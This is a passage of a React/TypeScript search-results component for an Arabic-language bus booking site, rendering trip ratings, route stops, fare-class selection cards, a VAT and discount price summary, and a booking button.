                        </div>
                      ))}
                    </div>

                    {/* Rating */}
                    <div className="flex items-center gap-3">
                      <div className="flex items-center gap-1">
                        {[1,2,3,4,5].map(s => (
                          <Star key={s} className={`w-3.5 h-3.5 ${s <= Math.round(Number(rating)) ? 'text-brand-gold fill-brand-gold' : 'text-[#E5E0D5]'}`} />
                        ))}
                        <span className="text-xs font-bold text-charcoal mr-1">{rating}</span>
                      </div>
                      {/* Occupancy Bar */}
                      <div className="hidden sm:flex items-center gap-1.5">
                        <div className="w-16 h-1.5 bg-[#F0EDE4] rounded-full overflow-hidden">
                          <div
                            className={`h-full rounded-full transition-all ${
                              occupancyPercent > 80 ? 'bg-red-400' : occupancyPercent > 50 ? 'bg-orange-400' : 'bg-green-400'
                            }`}
                            style={{ width: `${occupancyPercent}%` }}
                          />
                        </div>
                        <span className="text-[10px] text-[#B5AFA3]">{occupancyPercent}%</span>
                      </div>
                    </div>
                  </div>

                  {/* Trust Indicator */}
                  <div className="mt-3 flex items-center gap-2 text-[10px] text-[#B5AFA3]">
                    <Check className="w-3 h-3 text-green-500" />
                    <span>حجز أكثر من {bookingsLastWeek} شخصاً هذه الرحلة خلال الأسبوع الماضي</span>
                  </div>
                </div>

                {/* ─── Price Footer ─── */}
                <div className={`border-t px-5 py-4 ${isSelected ? 'border-brand-gold/30' : 'border-[#E5E0D5]'}`}>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      {/* Expand/Collapse */}
                      <button
                        onClick={(e) => { e.stopPropagation(); setExpandedTrip(isExpanded ? null : trip.id); }}
                        className="flex items-center gap-1 text-sm text-[#8A7E6B] hover:text-brand-gold font-bold transition-colors"
                      >
                        {isExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                        {isExpanded ? 'إخفاء التفاصيل' : 'عرض التفاصيل'}
                      </button>
                    </div>
                    <div className="text-left flex items-center gap-4">
                      {bookingData.tripType === 'round-trip' && (
                        <div className="text-right">
                          <div className="text-xs text-[#B5AFA3] line-through">{tl} ر.س</div>
                          <div className="text-[10px] text-green-600 font-bold">وفّر 15%</div>
                        </div>
                      )}
                      <div>
                        <div className={`text-2xl font-extrabold ${isSelected ? 'text-brand-gold' : 'text-charcoal'}`}>
                          {tripTotal}<span className="text-sm mr-1">ر.س</span>
                        </div>
                        <div className="text-[10px] text-[#B5AFA3]">يشمل الضريبة</div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* ─── Expanded Details (Accordion) ─── */}
                {isExpanded && (
                  <div className="border-t border-[#E5E0D5] px-5 py-5 bg-[#FAFAF8] animate-fade-in" onClick={e => e.stopPropagation()}>
                    {/* ═══ Route Details: Description + Stops + Route Path ═══ */}
                    {trip.routeDetails && (
                      <div className="mb-5 space-y-4">
                        {/* Description */}
                        <div className="bg-white rounded-2xl p-4 border border-[#E5E0D5]">
                          <h4 className="font-extrabold text-charcoal mb-2 flex items-center gap-2 text-sm">
                            <Bus className="w-4 h-4 text-brand-gold" />
                            عن الرحلة
                          </h4>
                          <p className="text-[#8A7E6B] text-xs leading-relaxed">{trip.routeDetails.description}</p>
                        </div>

                        {/* Route Path - Visual Timeline */}
                        {trip.routeDetails.routePath && trip.routeDetails.routePath.length > 0 && (
                          <div className="bg-white rounded-2xl p-4 border border-[#E5E0D5]">
                            <h4 className="font-extrabold text-charcoal mb-3 flex items-center gap-2 text-sm">
                              <Route className="w-4 h-4 text-brand-gold" />
                              خط السير
                            </h4>
                            <div className="flex flex-wrap items-center gap-1">
                              {trip.routeDetails.routePath.map((city, idx) => (
                                <React.Fragment key={idx}>
                                  <span className={`text-[11px] px-2 py-1 rounded-full font-bold ${
                                    idx === 0 ? 'bg-green-100 text-green-700' :
                                    idx === trip.routeDetails!.routePath!.length - 1 ? 'bg-red-100 text-red-700' :
                                    city.includes('منفذ') || city.includes('جسر') || city.includes('ميناء') || city.includes('عبّارة')
                                      ? 'bg-orange-100 text-orange-700' : 'bg-[#F5F3EF] text-[#8A7E6B]'
                                  }`}>
                                    {city.includes('منفذ') || city.includes('جسر') || city.includes('ميناء') || city.includes('عبّارة') ? '🛂 ' : ''}
                                    {city}
                                  </span>
                                  {idx < trip.routeDetails!.routePath!.length - 1 && (
                                    <ChevronLeft className="w-3 h-3 text-[#D5CFC5] rotate-180" />
                                  )}
                                </React.Fragment>
                              ))}
                            </div>
                          </div>
                        )}

                        {/* Stops Table */}
                        {trip.routeDetails.stops && trip.routeDetails.stops.length > 0 && (
                          <div className="bg-white rounded-2xl p-4 border border-[#E5E0D5]">
                            <h4 className="font-extrabold text-charcoal mb-3 flex items-center gap-2 text-sm">
                              <Clock className="w-4 h-4 text-brand-gold" />
                              نقاط التوقف والمحطات
                            </h4>
                            <div className="space-y-2">
                              {trip.routeDetails.stops.map((stop, idx) => {
                                const isAutoRest = stop.city.includes('استراحة');
                                const typeLabels: Record<string, { label: string; color: string; bg: string }> = {
                                  pickup: { label: 'انطلاق', color: 'bg-green-500', bg: 'bg-green-50' },
                                  dropoff: { label: 'وصول', color: 'bg-red-500', bg: 'bg-red-50' },
                                  rest: { label: isAutoRest ? 'استراحة (300km)' : 'استراحة', color: isAutoRest ? 'bg-emerald-500' : 'bg-blue-500', bg: isAutoRest ? 'bg-emerald-50' : 'bg-blue-50' },
                                  border: { label: 'منفذ حدودي', color: 'bg-orange-500', bg: 'bg-orange-50' },
                                  transit: { label: 'عبور', color: 'bg-[#B5AFA3]', bg: 'bg-gray-50' },
                                };
                                const typeInfo = typeLabels[stop.type] || typeLabels.transit;
                                return (
                                  <div key={idx} className="flex items-center gap-3">
                                    {/* Timeline dot */}
                                    <div className="flex flex-col items-center self-stretch">
                                      <div className={`w-3 h-3 rounded-full ${typeInfo.color} shrink-0`} />
                                      {idx < trip.routeDetails!.stops!.length - 1 && (
                                        <div className="w-0.5 flex-1 bg-[#E5E0D5] my-0.5" />
                                      )}
                                    </div>
                                    {/* Stop info */}
                                    <div className={`flex-1 flex items-center justify-between py-1 px-2 rounded-lg ${isAutoRest ? 'bg-emerald-50 border border-emerald-200' : ''}`}>
                                      <div className="flex items-center gap-2">
                                        {isAutoRest && <span className="text-base">&#9749;</span>}
                                        <span className="text-sm font-bold text-charcoal">{stop.city}</span>
                                        <span className={`text-[10px] px-1.5 py-0.5 rounded-full text-white ${typeInfo.color}`}>{typeInfo.label}</span>
                                      </div>
                                      <span className="text-xs text-[#8A7E6B] font-mono" dir="ltr">{stop.duration}</span>
                                    </div>
                                  </div>
                                );
                              })}
                            </div>
                          </div>
                        )}
                      </div>
                    )}

                    {/* ═══ Professional Fare Selection Cards ═══ */}
                    <div className="flex gap-3 mb-4">
                      {fareTypes.map(fare => {
                        const isSelected = selectedFare === fare.id;
                        return (
                          <button
                            key={fare.id}
                            onClick={(e) => { e.stopPropagation(); setSelectedFare(fare.id); }}
                            className={`flex-1 relative rounded-2xl border-2 text-right transition-all duration-300 overflow-hidden ${
                              isSelected
                                ? fare.id === 'vip'
                                  ? 'border-brand-gold bg-gradient-to-b from-[#FDF8E8] to-[#F5ECD0] shadow-lg shadow-brand-gold/20'
                                  : 'border-blue-400 bg-gradient-to-b from-blue-50 to-white shadow-lg shadow-blue-100'
                                : 'border-[#E5E0D5] bg-white hover:border-[#D5CFC5] hover:shadow-md'
                            }`}
                          >
                            {/* Recommended badge */}
                            {fare.recommended && (
                              <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-brand-gold via-[#D4A03A] to-brand-gold" />
                            )}
                            <div className={`px-4 pt-4 pb-3 ${fare.recommended ? 'pt-5' : ''}`}>
                              {/* Badge + Name */}
                              <div className="flex items-center justify-between mb-2">
                                <span className={`text-[10px] font-bold text-white px-2 py-0.5 rounded-full ${fare.badgeColor}`}>{fare.badge}</span>
                                <div className="flex items-center gap-1.5">
                                  <span className={`font-extrabold text-sm ${isSelected ? 'text-charcoal' : 'text-[#8A7E6B]'}`}>{fare.name}</span>
                                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-all ${
                                    isSelected
                                      ? fare.id === 'vip' ? 'border-brand-gold bg-brand-gold' : 'border-blue-400 bg-blue-400'
                                      : 'border-[#D5CFC5]'
                                  }`}>
                                    {isSelected && <Check className="w-3 h-3 text-white" />}
                                  </div>
                                </div>
                              </div>
                              {/* Description */}
                              <p className="text-[11px] text-[#8A7E6B] mb-3">{fare.desc}</p>
                              {/* Features grid */}
                              <div className="grid grid-cols-2 gap-1.5">
                                {fare.features.map((f, fi) => (
                                  <span key={fi} className={`inline-flex items-center gap-1 text-[10px] px-1.5 py-1 rounded-lg ${
                                    isSelected
                                      ? fare.id === 'vip' ? 'bg-brand-gold/10 text-[#7A6B3E]' : 'bg-blue-50 text-blue-700'
                                      : 'bg-[#F5F3EF] text-[#8A7E6B]'
                                  }`}>
                                    <span className={isSelected ? (fare.id === 'vip' ? 'text-brand-gold' : 'text-blue-400') : 'text-[#B5AFA3]'}>{featureIconsMap[f.icon]}</span>
                                    {f.label}
                                  </span>
                                ))}
                              </div>
                              {/* Price indicator */}
                              <div className={`mt-3 pt-2 border-t flex items-center justify-between ${
                                isSelected ? (fare.id === 'vip' ? 'border-brand-gold/20' : 'border-blue-100') : 'border-[#F0EDE4]'
                              }`}>
                                <span className="text-[10px] text-[#8A7E6B]">السعر لكل راكب</span>
                                <span className={`font-extrabold text-sm ${
                                  isSelected ? (fare.id === 'vip' ? 'text-brand-gold' : 'text-blue-600') : 'text-charcoal'
                                }`}>
                                  {Math.round(trip.basePrice * getFareMultiplier(fare.id as 'economy' | 'business' | 'vip'))} ر.س
                                </span>
                              </div>
                            </div>
                          </button>
                        );
                      })}
                    </div>

                    {/* Price Summary */}
                    <div className={`rounded-2xl p-4 space-y-2.5 border text-sm mb-4 ${
                      selectedFare === 'vip'
                        ? 'bg-gradient-to-b from-[#FDF8E8] to-white border-brand-gold/30'
                        : 'bg-white border-[#E5E0D5]'
                    }`}>
                      <h4 className="font-extrabold text-charcoal mb-2 flex items-center gap-1.5">
                        <Receipt className={`w-4 h-4 ${selectedFare === 'vip' ? 'text-brand-gold' : 'text-blue-400'}`} />
                        ملخص السعر
                      </h4>
                      <div className="flex justify-between">
                        <span className="text-[#8A7E6B]">{currentFare.name} × {bookingData.passengers} مسافر</span>
                        <span className="text-charcoal font-bold">{st.toFixed(2)} ر.س</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-[#8A7E6B]">ضريبة القيمة المضافة (15%)</span>
                        <span className="text-charcoal font-bold">{vat.toFixed(2)} ر.س</span>
                      </div>
                      {bookingData.tripType === 'round-trip' && (
                        <div className="flex justify-between text-green-600">
                          <span>خصم ذهاب وعودة (15%)</span>
                          <span className="font-bold">-{(tl * 0.15).toFixed(2)} ر.س</span>
                        </div>
                      )}
                      <div className={`border-t pt-2.5 flex justify-between font-extrabold text-lg ${
                        selectedFare === 'vip' ? 'border-brand-gold/20' : 'border-[#E5E0D5]'
                      }`}>
                        <span className="text-charcoal">الإجمالي</span>
                        <span className={selectedFare === 'vip' ? 'text-brand-gold' : 'text-blue-600'}>{tripTotal} ر.س</span>
                      </div>
                    </div>

                    {/* Book Button */}
                    <button
                      onClick={(e) => { e.stopPropagation(); handleBookNow(trip.id); }}
                      className={`w-full h-12 text-white font-bold rounded-2xl shadow-button hover:shadow-button-hover transition-all text-base ${
                        selectedFare === 'vip'
                          ? 'gold-gradient'
                          : 'bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700'
                      }`}
                    >
                      احجز الآن - {tripTotal} ر.س
                    </button>
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
};

export default SearchResults;
